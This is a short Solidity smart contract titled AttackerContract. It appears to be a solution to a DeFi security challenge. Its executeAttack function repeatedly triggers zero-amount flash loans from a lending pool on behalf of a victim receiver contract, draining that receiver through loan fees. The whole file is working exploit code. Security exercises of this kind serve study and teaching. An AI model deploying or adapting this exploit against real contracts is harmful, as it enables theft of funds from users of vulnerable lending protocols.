// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title AttackerContract
 */
contract AttackerContract {
    using Address for address;

    address private pool;
    address private receiver;

    constructor(address poolAddress, address flashLoanReceiver) {
        pool = poolAddress;
        receiver = flashLoanReceiver;
    }

    function executeAttack() external {
        for (uint256 i = 0; i < 10; i++) {
            pool.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    receiver,
                    0
                )
            );
        }
    }
}
